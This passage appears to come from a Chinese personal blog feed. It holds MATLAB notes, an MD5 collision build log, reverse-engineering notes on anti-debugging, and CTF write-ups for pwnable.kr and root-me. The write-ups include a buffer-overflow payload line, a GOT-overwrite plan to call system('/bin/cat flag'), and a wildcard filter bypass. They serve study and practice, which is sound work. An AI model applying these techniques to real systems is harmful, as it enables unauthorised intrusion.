    <content><![CDATA[<p>使用基于帕斯卡三角形的项创建一个对称矩阵：<br><code>A = pascal(3)</code></p>
<p>randi 的第一个输入描述整数可能值的范围，后面两个输入描述行和列的数量。<br><code>C = randi(10,3,2)</code></p>
<p>有一个专门的点积函数，称为 <code>dot</code>。</p>
<a id="more"></a>
<p>非共轭复数转置（其中每个元素的复数部分保留其符号）表示为<code> z.&#39;</code></p>
<p><code>eye(m,n)</code><br>返回 m×n 矩形单位矩阵，eye(n) 返回 n×n 单位方阵。</p>
<p>向量 x 的 p-范数，<br><code>norm(x,p)</code> 进行计算，此运算是为 p &gt; 1 的任意值定义的，但最常见的 p 值为 1、2 和 ∞。默认值为 p = 2，</p>
<p><code>x = b/A</code><br>表示使用 mrdivide 获得的矩阵方程 xA = b 的解。<br><code>x = A\b</code><br>表示使用 mldivide 获得的矩阵方程 Ax = b 的解。</p>
<p><code>(b/A)&#39; = (A&#39;\b&#39;)</code>.<br>m = n<br>方阵方程组。求精确解。<br>m &gt; n<br>超定方程组，即方程个数多于未知数个数。求最小二乘解。<br>m &lt; n<br>欠定方程组，即方程个数少于未知数个数。使用最多 m 个非零分量求基本解。</p>
<p><em>非奇异矩阵==可逆矩阵</em></p>
<p><code>eig</code><br>特征值和特征向量</p>
<p>提供的数据分析函数的列表，请键入<br><code>help datafun</code></p>
<hr>
<h1 id="图像"><a href="#图像" class="headerlink" title="图像"></a>图像</h1><p>要显示图像，请使用 imshow 函数：<br><code>imshow(X,map)</code><br>使用<code> imread</code> 函数可以读取标准图像文件（TIFF、JPEG、PNG 等）。imread 返回的数据类型取决于读取的图像类型。<br>使用<code> imwrite</code> 函数可以将 MATLAB 数据写入到各种标准图像格式。<br>大多数图像表示为二维数组（矩阵），其中矩阵的每个元素对应所显示图像的一个像素。例如，由 200 行和 300 列不同颜色的点组成的图像保存为一个 200×300 的矩阵。有些图像，如 RGB，需要三维数组，其中三个维度的第一个平面表示红色像素强度，第二个平面表示绿色像素强度，第三个平面表示蓝色像素强度。<br>MATLAB 数学支持三种不同的数值类用于图像显示：<br>双精度浮点数（double）<br>16 位无符号整数（uint16）<br>8 位无符号整数（uint8）</p>
<pre><code>imshow    显示图像
image    从数组显示图像
imagesc    显示使用经过标度映射的颜色的图像
imread    从图形文件读取图像
imresize    调整图像大小
imwrite    将图像写入图形文件
imfinfo    有关图形文件的信息
imformats    管理图像文件格式注册表
frame2im    返回与影片帧关联的图像数据
im2frame    将图像转换为影片帧
im2java    将图像转换 Java 图像
im2double    将图像转换为双精度值
ind2rgb    将索引图像转换为 RGB 图像
rgb2gray    将 RGB 图像或颜色图转换为灰度图
rgb2ind    将 RGB 图像转换为索引图像
imapprox    通过减少颜色数量来近似处理索引图像
dither    转换图像，通过抖动提高表观颜色分辨率
cmpermute    重新排列颜色图中的颜色
cmunique    消除颜色图中的重复颜色；将灰度或真彩色图像转换为索引图像</code></pre>
<p><code>A = imread(&#39;ngc6543a.jpg&#39;);</code></p>
<hr>
<p>索引图像由数据矩阵 X 和颜色图矩阵 map 组成。map 是一个 double 类的 m×3 数组，由 [0, 1] 范围内的浮点值组成。map 的每一行指定单一颜色的红、绿和蓝分量。索引图像使用像素值到颜色图值的“直接映射”。每个图像像素的颜色是以 X 中的对应值为索引求得的 map 中的值。<strong>因此 X 值必须是整数。值 1 指向 map 中第一行，值 2 指向第二行，以此类推。使用以下语句显示索引图像。</strong><br><code>image(X); colormap(map)</code><br>图像矩阵和颜色图中值的关系取决于图像矩阵的类。如果图像矩阵是 double 类，那么值 1 指向颜色图中的第一行，值 2 指向第二行，以此类推。如果图像矩阵是 uint8 或 uint16 类，那么有个偏移 - 值 0 指向颜色图中的第一行，值 1 指向第二行，以此类推。在图形文件格式中使用偏移是为了使可支持的颜色数目达到最大。在上面的图像中，图像矩阵是 double 类。</p>
<hr>
<p>强度图像是一个数据矩阵 I，其中的值表示某一范围内的强度。强度图像表示为单个矩阵，矩阵的每个元素对应一个图像像素。<br>imagesc(A); colormap(gray)<br>imagesc(A,[min(A(:)) max(A(:))]); colormap(gray)</p>
<hr>
<p>bit-depth：使用多少位来定义一个像素点。bit-depth越大，可以表示的色彩就越多。通常情况下，图像的像素值范围为0-255， 则其bit-depth就是8。RGB图像的bit-depth为24：8bit表示R，8bit表示G，8bit表示B。</p>
<p>RGB 图像，有时称为真彩色图像，以 m×n×3 数据数组形式存储，该数组定义了对应图像每个像素的红色、绿色和蓝色分量。<br><strong>例如像素 (10,5) 的红色、绿色和蓝色分量分别存储在 RGB(10,5,1)、RGB(10,5,2) 和 RGB(10,5,3) 中。</strong></p>
<hr>
<p>您可以对 uint8 和 uint16 数组执行其他几种操作，包括：<br>使用 reshape、cat、permute 函数以及 [] 和 ‘ 运算符重构、重新排序和串联数组<br>使用 save 和 load 将 uint8 和 uint16 数组保存及加载到 MAT 文件。（请记住，如果要加载或保存图形格式文件图像，则必须使用 imread 和imwrite 命令代替。）<br>使用 find 定位 uint8 和 uint16 数组中非零元素的索引。但返回的数组始终为 double 类。<br>关系运算符</p>
<p>基于 NTSC 标准合并 RGB 值，以此方式来计算单色亮度，这会将与眼睛敏感度相关的系数应用到 RGB 颜色：</p>
<pre><code>I = .2989*rgb_img(:,:,1)...
    +.5870*rgb_img(:,:,2)...
    +.1140*rgb_img(:,:,3);</code></pre>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>md5快速碰撞</title>
    <url>/2020/12/17/md5%E5%BF%AB%E9%80%9F%E7%A2%B0%E6%92%9E/</url>
    <content><![CDATA[<h1 id="md5快速碰撞"><a href="#md5快速碰撞" class="headerlink" title="md5快速碰撞"></a>md5快速碰撞</h1><p><a href="https://github.com/Finsenty54/fast_collision">https://github.com/Finsenty54/fast_collision</a></p>
<h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><h3 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h3><p><a href="https://www.runoob.com/w3cnote/cpp-header.html">https://www.runoob.com/w3cnote/cpp-header.html</a><br>C++ 语言支持”分别编译”（separatecompilation）。也就是说，一个程序所有的内容，可以分成不同的部分分别放在不同的 .cpp 文件里。.cpp 文件里的东西都是相对独立的，在编译（compile）时不需要与其他文件互通，只需要在编译成<code>目标文件</code>后再与其他的目标文件做一次<code>链接</code>（link）就行了。</p>
<a id="more"></a>
<h3 id="条件编译"><a href="#条件编译" class="headerlink" title="条件编译"></a>条件编译</h3><h3 id="boost安装"><a href="#boost安装" class="headerlink" title="boost安装"></a>boost安装</h3><p><code>./b2 install </code>后</p>
<p>执行<code>sudo ldconfig</code><br>运行程序后就能加载共享库</p>
<p><em>程序运行结果</em></p>
<pre><code>┌─[zentreisender@parrotos]─[~/Documents/essay!!!!!!!!!!/hash_collision/fast_collision]
└──╼ $./first_try 
Generating first block: ........ 6.637388s wall, 6.620000s user + 0.000000s system = 6.620000s CPU (99.7%)</code></pre>
<hr>
<h3 id="查找后缀文件"><a href="#查找后缀文件" class="headerlink" title="查找后缀文件"></a>查找后缀文件</h3><pre><code>find -name &quot;*.txt&quot; | xargs rm
xargs --help
Usage: xargs [OPTION]... COMMAND [INITIAL-ARGS]...</code></pre>
<hr>
<pre><code>find ./ -regextype posix-extended -regex &quot;.*\.(txt|bin)&quot; </code></pre>
<h3 id="vscodium调试"><a href="#vscodium调试" class="headerlink" title="vscodium调试"></a>vscodium调试</h3><p>注意在调试时需要在<code>makefile</code>文件中配置好debug（方法参考2.使用命令行调试大型程序部分），否则无法标记断点。</p>
<p><code>在生成对象文件时加 -g</code></p>
<h3 id="parrot-os安装中文输入法"><a href="#parrot-os安装中文输入法" class="headerlink" title="parrot os安装中文输入法"></a>parrot os安装中文输入法</h3><p><a href="https://parrotsec-cn.org/t/ibus-rime/3950">https://parrotsec-cn.org/t/ibus-rime/3950</a><br>ibus-rime</p>
<h3 id="函数常数是数组"><a href="#函数常数是数组" class="headerlink" title="函数常数是数组"></a>函数常数是数组</h3><p>C++ 传数组给一个函数，数组类型自动转换为指针类型，因而传的实际是地址。</p>
]]></content>
      <categories>
        <category>HASH</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>nice try</title>
    <url>/2020/10/27/nice_try/</url>
    <content><![CDATA[<h2 id="lt-逆向工程-核心原理-gt-终结"><a href="#lt-逆向工程-核心原理-gt-终结" class="headerlink" title="&lt;逆向工程-核心原理&gt;终结"></a>&lt;逆向工程-核心原理&gt;终结</h2><p><strong>看了两三年，终于看完了，</strong><code>nice try </code>2020-10-27 15:20:20 星期二  :tw-1f4aa:</p>
<p><em>接下来的是阅读过程中的一些笔记</em></p>
<a id="more"></a>
<hr>
<h3 id="内核调试"><a href="#内核调试" class="headerlink" title="内核调试"></a>内核调试</h3><p>终端中输入 <code>bcdedit -debug on</code><br>开启内核调试模式</p>
<h3 id="WINDBG"><a href="#WINDBG" class="headerlink" title="WINDBG"></a>WINDBG</h3><pre><code>lkd&gt; u nt!ZwCreateFile L50</code></pre>
<p>查看createfile 代码<br>u 反汇编 u L10显示10行命令</p>
<p>db命令<br>d-display</p>
<hr>
<h3 id="删除ASLR功能"><a href="#删除ASLR功能" class="headerlink" title="删除ASLR功能"></a>删除ASLR功能</h3><p>将选择头中的DLL Characteristics中DYNAMIC_BASE标志删除即可</p>
<hr>
<h3 id="TLS回调函数"><a href="#TLS回调函数" class="headerlink" title="TLS回调函数"></a>TLS回调函数</h3><p>长用于反调试<br>类似于linux <code>ptrace() </code>函数</p>
<p>每当创建/终止进程的线程时会自动调用执行的函数。创建进程的主线程会先于EP代码，调用回调函数</p>
<p>在选择头中有TLS表地址，里面是tls结构体的地址，可能有多个结构体，<code>address of callbacks</code>成员指向tls函数地址</p>
<hr>
<h3 id="isDebuggerPersent"><a href="#isDebuggerPersent" class="headerlink" title="isDebuggerPersent()"></a>isDebuggerPersent()</h3><p>检查<code>peb.deingdebugged</code>值，<code>+02</code>处<br>判断是否处于调试</p>
<p><code>getmodulehandle()</code><br>获取进程imagebase</p>
<hr>
<h3 id="windbg-配置符号表"><a href="#windbg-配置符号表" class="headerlink" title="windbg 配置符号表"></a>windbg 配置符号表</h3><p>srv*<a href="https://msdl.microsoft.com/download/symbols">https://msdl.microsoft.com/download/symbols</a><br>通知 WinDbg 进行符号文件的初始查找和加载：<br>.reload<br>Lm 查看已加载模块</p>
<p><code>dt </code><br>displays information about a local variable, global variable or data type</p>
<p>dt _teb<br>dt _peb<br>dt _peb_ldr_data</p>
<hr>
<h3 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a>PEB</h3><p>模块=dll加载后，通过PEB.ldr 直接获取该模块的加载基地址</p>
<p><code>FS:[0]</code> TEB起始地址</p>
<p><code>FS:[30]</code> PEB起始地址</p>
<hr>
<h3 id="利用SEH机制的反调试技术"><a href="#利用SEH机制的反调试技术" class="headerlink" title="利用SEH机制的反调试技术"></a>利用SEH机制的反调试技术</h3><p>程序在正常运行和调试运行时表现出的行为动作是不同的<br>正常：程序自己处理<br>调试时：抛给调试器处理</p>
<p>通过<code>TEB.NtTib.ExceptionList </code>找到SEH链</p>
<pre><code>TEB.NtTib.ExceptionList =FS：[0]</code></pre>
<hr>
<p>结构体 构成链</p>
<pre><code>* next_seh
* handler</code></pre>
<p>esp+c 即指向 pContext<br>seh函数参数第三个为<code>指向pContext的指针</code>，保存<code>线程寄存器值</code>，执行其他进程就会保存寄存器值。<br><code>*pContext+B8 </code>(32位下）为EIP值， <code>修改EIP</code>，改变执行流程<br>一样，通过<code>PEB.isdebuggerpersent()</code>API 取得beingDebugged值判断</p>
<hr>
<h3 id="保护器，压缩器"><a href="#保护器，压缩器" class="headerlink" title="保护器，压缩器"></a>保护器，压缩器</h3><p> 反调试–一个更简单，更好的方法：判断当前系统是否是为逆向分析专用系统</p>
<pre><code>findWindow() , createTOOLhelp32SnapsHOT()
, GETcomputerName()</code></pre>
<h3 id="OllyDBG-view-seh-chain"><a href="#OllyDBG-view-seh-chain" class="headerlink" title="OllyDBG view-seh chain"></a>OllyDBG view-seh chain</h3><p><code>PEB.ImageBase</code> 保存进程的实际映射地址</p>
<h3 id="debug-blocker"><a href="#debug-blocker" class="headerlink" title="debug blocker"></a>debug blocker</h3><ol>
<li><p>被调试进程不能被其他进程调试</p>
</li>
<li><p>调试器操作被调试者的代码</p>
</li>
<li><p>调试器处理被调试进程中发生的异常</p>
</li>
</ol>
<h3 id="clbp"><a href="#clbp" class="headerlink" title="clbp"></a>clbp</h3><p>ollydgb的<code>条件记录断点</code><br>ctrl+G 将光标移到4011f0地址后，按shift+f4，打开设置CLBP对话框（条件断点）</p>
<p>detach 分离</p>
<pre><code>EB FE 无限循环</code></pre>
<p><code>DebugActiveProcessStop()</code><br>将被调试者从调试器中分离出来</p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr (1)</title>
    <url>/2021/03/06/pwnable.kr_1/</url>
    <content><![CDATA[<h1 id="pwnable-kr-1"><a href="#pwnable-kr-1" class="headerlink" title="pwnable.kr (1)"></a>pwnable.kr (1)</h1><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>函数调用栈的查看<br>backtrace：查看函数调用的顺序（函数调用栈的信息）<br>frame N：切换到栈编号为N的上下文中<br>info frame：查看当前函数调用的栈帧信息</p>
<p>“disassemble /r”命令可以用16进制形式显示程序的原始机器码<br>disass /r ‘fflush@plt’</p>
<p>echo $PATH</p>
<a id="more"></a>
<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>32位， <code>p32()</code> 可以让我们转换整数到<code>小端序</code>格式</p>
<pre><code>c.sendline(b&quot;AAAA&quot;*13+p32(0xcafebabe))</code></pre>
<p>加个<code>b</code>，不然是str格式，即<code>utf-8</code>，编码不一样<br>bytes字节符，打印以b开头</p>
<pre><code>┌─[zentreisender@parrotos]─[~/Documents/pwnable.kr/BOF]
└──╼ $python3 exploit.py 
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ id
uid=1008(bof) gid=1008(bof) groups=1008(bof)</code></pre>
<p>id 命令</p>
<h3 id="带参运行"><a href="#带参运行" class="headerlink" title="带参运行"></a>带参运行</h3><p>shell=ssh(‘col’,’pwnable.kr’, port=2222 ,password=’guest’)<br>p=shell.process(argv=[‘./col’,data_final]) #带参运行<br>ssh 链接也可以用process()</p>
<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。<br>每个<code>Unix进程（</code>除了可能的守护进程）应均有<code>三个标准的POSIX文件描述符</code>，对应于三个标准流</p>
<p>strcmp()<br>0    the contents of both strings are equal</p>
<pre><code>0    Standard input    STDIN_FILENO    stdin
1    Standard output    STDOUT_FILENO    stdout
2    Standard error    STDERR_FILENO    stderr</code></pre>
<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>做的少了，拿着文件单步运行了半天，又是strace , ltrace ,想看出些名堂，后来偶然看到upx字符串，就想不是win才有upx压缩，最后放弃；一搜wp才发现linux底下，<code>upx -d </code>就行。</p>
<p>断点到leave, 然后<br>peda:<br><code>x/s malloc</code>地址就得到flag</p>
<h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><p>got 表项覆盖</p>
<p><a href="https://medium.com/@andrew-bae/pwnable-kr-passcode-writeup-2fdfd9fec283">https://medium.com/@andrew-bae/pwnable-kr-passcode-writeup-2fdfd9fec283</a><br>栈溢出，<code>scanf(%100, name)</code></p>
<pre><code>   0x804862f &lt;welcome+38&gt;:    lea    edx,[ebp-0x70]</code></pre>
<p>0x70=112 至少116个字符溢出到返回地址，name总共一百，所以溢出name不行</p>
<hr>
<p>  [24] .data             PROGBITS        0804a024 001024 000008 00  WA  0   0  4<br>我们直接在相应位置ebp-0x10, ebp-0xc放入想要的数字，但是scanf遇空格结束输入 </p>
<p>gdb-peda$ print $ebp-0x70<br>$1 = (void *) 0xffe43ab8</p>
<pre><code>0x804857c &lt;login+24&gt;:    mov    edx,DWORD PTR [ebp-0x10]

0x80485aa &lt;login+70&gt;:    mov    edx,DWORD PTR [ebp-0xc]

0x80485c5 &lt;login+97&gt;:    cmp    DWORD PTR [ebp-0x10],0x528e6
0x80485ce &lt;login+106&gt;:    cmp    DWORD PTR [ebp-0xc],0xcc07c9</code></pre>
<p>0x70-xc =100 刚好溢出不到</p>
<hr>
<p>scanf()函数接收输入数据时，遇以下情况结束一个数据的输入：<br>① 遇空格、“回车”、“跳格”键。<br>② 遇宽度结束。<br>③ 遇非法输入。</p>
<hr>
<p>Partial RELRO(The GOT table can be overwritten)</p>
<p>So, if I <code>overwrite fflush@got.plt address</code> as <code>system(“/bin/cat flag”)</code>; address, this binary will execute system(“/bin/cat flag”); after scanf .</p>
<h3 id="小端序研究"><a href="#小端序研究" class="headerlink" title="小端序研究"></a>小端序研究</h3><pre><code>objdump -R ./passcode
0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0

plt 表项
8048430:    ff 25 04 a0 04 08        jmp    *0x804a004
命令中地址倒序，即小端序
got 表中地址也是倒序，即小端序
0x804a00c &lt;puts@got.plt&gt;:    0xf7597ca0
0x804a00c &lt;puts@got.plt&gt;:    0xa0    0x7c    0x59 0xf7

栈中地址也是小端序
0000| 0xffb30e38 --&gt; 0xffb30e58
gdb-peda$ x/4bx $esp
0xffb30e38:    0x58    0x0e    0xb3    0xff

只是存储方式是小端序，读出来还是原本的顺序
payload += p32(0x0804a004)所以我们小端序写入栈中，执行地址没有小端序，why?

输入12345678 = 0xBC 614E
gdb-peda$ x/4bx $ebp-0xc
0xffffcf4c:    0x4e    0x61    0xbc    0x00
栈中是小端序
输入的是单字节还是顺序存储，多字节如int，都是小端序</code></pre>
<hr>
<p>将fflush的got中的地址改为system的地址，这个地址不是libc库中的地址，而是代码段中的地址，即可以是任意可执行地址， 例如0x080485ea，但还要传参数，所以要提前一些：</p>
<pre><code>   0x080485e3 &lt;+127&gt;:    mov    DWORD PTR [esp],0x80487af
   0x080485ea &lt;+134&gt;:    call   0x8048460 &lt;system@plt&gt;
   0x080485ef &lt;+139&gt;:    leave  
   0x080485f0 &lt;+140&gt;:    ret    </code></pre>
<p>0x80487af 字符串参数<br> 0x080485ea &lt;+134&gt;:    call   0x8048460 &lt;system@plt&gt;</p>
<p>代码：<br><a href="https://github.com/Finsenty54/attack-code/blob/master/pwnable.kr/passcode.py">https://github.com/Finsenty54/attack-code/blob/master/pwnable.kr/passcode.py</a></p>
<h2 id="rondom"><a href="#rondom" class="headerlink" title="rondom"></a>rondom</h2><p>简单，rand() 不是true rondom</p>
<h2 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h2><h2 id="arm"><a href="#arm" class="headerlink" title="arm"></a>arm</h2><p><a href="https://www.cnblogs.com/ichunqiu/p/9056630.html">https://www.cnblogs.com/ichunqiu/p/9056630.html</a><br>在执行add r0, r1, #5指令时，第二条指令正在译码阶段，而第三条指令正在取指阶段。在执行第一条指令时，PC寄存器应指向第三条指令。也即，当处理器为三级流水线结构时，PC寄存器总是指向随后的第三条指令。</p>
<p>当处理器处于ARM状态时，每条ARM指令为4个字节，所以PC寄存器的值为当前指令地址 + 8字节<br>当处理器处于Thumb状态时，每条Thumb指令为2字节，所以PC寄存器的值为当前指令地址 + 4字节 </p>
<pre><code>/*  key1
    0x00008cdc &lt;+8&gt;:    mov    r3, pc
       0x00008ce0 &lt;+12&gt;:    mov    r0, r3
           pc=0x8ce4
    r4=pc
    key2
    取pc值的时候应该还在arm状态
        pc=0x00008d0c
    key3
    lr 返回地址=0x00008d80
将三个pc值加在一起 等于输入进的 k
*/</code></pre>
<p>服务器好像down了<br>直接给falg:<code>My daddy has a lot of ARMv5te muscle!</code></p>
<h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><p>fd=open(“/home/mistake/password”,O_RDONLY,0400) &lt; 0</p>
<p>比较运算符高于赋值运算符</p>
<h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><p><a href="https://linux.die.net/man/7/credentials">https://linux.die.net/man/7/credentials</a><br><a href="https://en.wikipedia.org/wiki/User_identifier">https://en.wikipedia.org/wiki/User_identifier</a></p>
<h3 id="各user-id"><a href="#各user-id" class="headerlink" title="各user id"></a>各user id</h3><p>Effective user ID and effective group ID. These IDs are used by the kernel to determine the permissions that the process will have when accessing shared resources such as message queues, shared memory, and semaphores.On most UNIX systems, these IDs also determine the permissions when accessing files.<br> obtain its effective user (group) ID using geteuid(2) (getegid(2)).</p>
<p>Saved set-user-ID and saved set-group-ID. These IDs are used in set-user-ID and set-group-ID programs to <code>save a copy of the corresponding effective IDs </code>that were set when the program was executed (see execve(2)).<br>A set-user-ID program can assume and drop privileges by switching its effective user ID back and forth between the values in its real user ID and saved set-user-ID. This switching is done via calls to seteuid(2), setreuid(2), or setresuid(2).<br>比如ruid是普通用户，此时降权；suid是root，设置euid为suid后，提权<br> A process can obtain its saved set-user-ID (set-group-ID) using getresuid(2) (getresgid(2)).</p>
<p>Real user ID and real group ID. These IDs determine who owns the process. A process can obtain its real user (group) ID using getuid(2) (getgid(2)).</p>
<h3 id="setuid属性，权限，即文件有-s"><a href="#setuid属性，权限，即文件有-s" class="headerlink" title="setuid属性，权限，即文件有+s"></a>setuid属性，权限，即文件有+s</h3><p>-r-xr-sr-x  1 root shellshock_pwn   8547 Oct 12  2014 shellshock<br>When the setuid or setgid attributes are set on an executable file, then any users able to execute the file will automatically execute the file with the privileges of the file’s owner (commonly root) and/or the file’s group, depending upon the flags set</p>
<p>chmod by setting the high-order octal digit to 4 for setuid or 2 for setgid. “chmod 6711 file” will set both the setuid and setgid bits (4+2=6), making the file read/write/executable for the owner (7), and executable by the group (first 1) and others (second 1). When a user other than the owner executes the file, the process will run with user and group permissions set upon it by its owner. For example, if the file is owned by user root and group wheel, it will run as root:wheel no matter who executes the file.</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>4701 on an executable file owned by ‘root’ and the group ‘root’</p>
<p>A user named ‘thompson’ attempts to execute the file. The executable permission for all users is set (the ‘1’) so ‘thompson’ can execute the file. The file owner is ‘root’ and the SUID permission is set (the ‘4’) - so the file is executed as ‘root’.</p>
<h3 id="本题权限"><a href="#本题权限" class="headerlink" title="本题权限"></a>本题权限</h3><p>shellshock@pwnable:~$ stat -c “%a %A” shellshock<br>2555 -r-xr-sr-x<br> setgid bits</p>
<p>破壳（ShellShock）漏洞<br><a href="https://www.freebuf.com/articles/system/45390.html">https://www.freebuf.com/articles/system/45390.html</a></p>
<h2 id="coin1"><a href="#coin1" class="headerlink" title="coin1"></a>coin1</h2><p>服务器上没有按pwntools，运行不起来，改成re+socket中不行，懒得弄了</p>
<h2 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h2><p>echo $PATH<br>PATH表明程序所在的目录，运行一个程序，不在当前文件夹中，会遍历PATH中的目录，寻找程序所在文件夹<br>cat 命令在<code>/bin</code> 下<br>该题，用到了linux通配符<br><code>./cmd1 &quot;/bin/cat fla*&quot;</code></p>
]]></content>
      <categories>
        <category>pwnable.kr</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn复习.md</title>
    <url>/2022/01/10/pwn%E5%A4%8D%E4%B9%A0-md/</url>
    <content><![CDATA[<h2 id="pwn复习"><a href="#pwn复习" class="headerlink" title="pwn复习"></a>pwn复习</h2><h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><ol>
<li><code>n</code> 步过，<code>s</code>步进</li>
<li><code>set args toto</code> 设置参数</li>
<li>设置寄存器值<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> $ZF = <span class="number">6</span></span><br><span class="line"><span class="built_in">set</span> $eflags |= (<span class="number">1</span> &lt;&lt; $ZF)</span><br></pre></td></tr></table></figure>
将ZF设定为1</li>
<li>为断点设置命令<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">(gdb) command &lt;insert the number of the first breakpoint here&gt;</span><br><span class="line"> &gt; print $al^$dl  <span class="meta">#we print al xor dl, that is to say the expected char</span></span><br><span class="line"> &gt; <span class="keyword">continue</span></span><br><span class="line"> &gt; end  </span><br></pre></td></tr></table></figure>


</li>
</ol>
<h3 id="栈布局"><a href="#栈布局" class="headerlink" title="栈布局"></a>栈布局</h3><p>栈帧开辟-<br>下一个命令的地址 -&gt; 上一个栈帧的ebp -&gt; 新的栈<br>此时ebp 保存 &lt;上一个栈帧的ebp&gt; 的地址</p>
<h3 id="radare2使用"><a href="#radare2使用" class="headerlink" title="radare2使用"></a>radare2使用</h3><ol>
<li>图形模式下，按 <code>o</code> 进行跳转， 按 <code>u</code> 返回到上一个函数</li>
<li></li>
<li>third</li>
</ol>
<a id="more"></a>
]]></content>
  </entry>
  <entry>
    <title>root_me_PE_x86_SEHVEH_WP</title>
    <url>/2020/10/13/root_me_PE_x86_SEHVEH_WP/</url>
    <content><![CDATA[<h3 id="PE-DotNet-0-protection"><a href="#PE-DotNet-0-protection" class="headerlink" title="PE DotNet - 0 protection"></a>PE DotNet - 0 protection</h3><p>使用 <code>NET relector</code>工具<br>或者<code>dnSPY</code><br><a href="https://github.com/0xd4d/dnSpy/releases">https://github.com/0xd4d/dnSpy/releases</a><br>就可以破解</p>
<a id="more"></a>
<hr>
<h3 id="ELF-x64-Crackme-automating"><a href="#ELF-x64-Crackme-automating" class="headerlink" title="ELF x64 - Crackme automating"></a>ELF x64 - Crackme automating</h3><p>python 编程</p>
<p><code>别人写的代码</code><br><a href="https://mydiary42.wordpress.com/2019/01/26/root-me-crackme-automating/">https://mydiary42.wordpress.com/2019/01/26/root-me-crackme-automating/</a></p>
<p>int([x]) -&gt; integer<br>int(x, base=10) -&gt; integer<br>将数字或字符转为整形<br>Convert a number or string to an integer, or return 0 if no arguments are given. </p>
<pre><code>num=line[addr+1,-1]

byte.append(int (num,16)) //将num变为16进制</code></pre>
<p>使用<code>pwntools</code> / <code>Capstone</code> /<code>objdump</code> 获得反汇编代码<br>之后进行搜索</p>
<hr>
<h3 id="PE-x86-SEHVEH-WP"><a href="#PE-x86-SEHVEH-WP" class="headerlink" title="PE x86 - SEHVEH_WP"></a>PE x86 - SEHVEH_WP</h3><p>从题目知道是关于SEH 和 VEH（VectoredExceptionHandler）的。</p>
<p><em>OllyDBG 查看seh链 选择 <code>view-seh chain</code></em></p>
<hr>
<ol>
<li><p>在输入后进入主要部分。</p>
<img src="https://s1.ax1x.com/2020/10/13/0hMvnK.jpg" alt="0hMvnK.jpg" border="0" />
这段不是很懂，根据多次调试后判断，如果输入12个字节，则`0xB814A8`处就可以跳转，使`EBP`为0.
<img src="https://s1.ax1x.com/2020/10/13/0hQv2n.jpg" alt="0hQv2n.jpg" border="0" />
为0，即表示密码正确，会输入成功语句。
</li>
<li><p>接下来是第一部分密码</p>
<img src="https://s1.ax1x.com/2020/10/13/0hllIe.jpg" alt="0hllIe.jpg" border="0" />
`LODS `即将密码头四个字节放入`EAX`中，将`0x5A643059 xor 0x 3628552E `得到第一部分密码，还需反序排列为`weLl`
</li>
<li><p>FS：[0] 为TEB结构体中指向第一个SEH结构体地址</p>
<img src="https://s1.ax1x.com/2020/10/13/0h1iOP.jpg" alt="0h1iOP.jpg" border="0" />
<img src="https://s1.ax1x.com/2020/10/13/0h1fXt.jpg" alt="0h1fXt.jpg" border="0" />
即`0xEFFC14`.
接着，执行`INT 1`指令后，会进入`0xDB1D60`处的第一个SEH函数。
<img src="https://s1.ax1x.com/2020/10/13/0hdwPP.jpg" alt="0hdwPP.jpg" border="0" />
SEH函数的第三个参数，即`[ESP+C]`为pContext的地址，pContext保存线程切换时的寄存器信息。在PE 32位下，`+0xB0`为EAX寄存器的值，`0xB81D64`处将`0x48335621`加到`EAX+0xB0`中，保存着输入的第二部分四字节密码。
`+0xB8`为EIP寄存器的值，通过下面的判断将EIP值加2，结果为`0xB814E4`，即`INT 1`指令的下一条指令地址。
`XOR EAX,EAX`将EAX置0，表示从发生异常的代码处继续执行。
<img src="https://s1.ax1x.com/2020/10/13/0hwUL4.jpg" alt="0hwUL4.jpg" border="0" />
最后计算如下：
`FF2C F8E5 XOR 495F 4265 = B673 BA80 - 48335621 = 6E40 645F=n@d_`
反序排列为`_d@n`
</li>
<li><p><code>0xB814FF</code>处调用<code>AddVectoredExceptionHandler</code>函数，新增一个SEH函数。</p>
<img src="https://s1.ax1x.com/2020/10/13/0h09pV.jpg" alt="0h09pV.jpg" border="0" />
以下摘自https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">AddVectoredExceptionHandler</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  ULONG                       First,</span></span></span><br><span class="line"><span class="function"><span class="params">  PVECTORED_EXCEPTION_HANDLER Handler</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
`First`
The order in which the handler should be called. If the parameter is nonzero, the handler is the first handler to be called. If the parameter is zero, the handler is the last handler to be called.
如果不为0，则成为第一个调用的SEH函数，从图中可以看到，`First=1`.
`Handler`
A pointer to the handler to be called. For more information, see VectoredHandler.
从图中看出，函数地址为`0xB81940`，
`Return value`
If the function succeeds, the return value is a handle to the exception handler.
If the function fails, the return value is NULL.
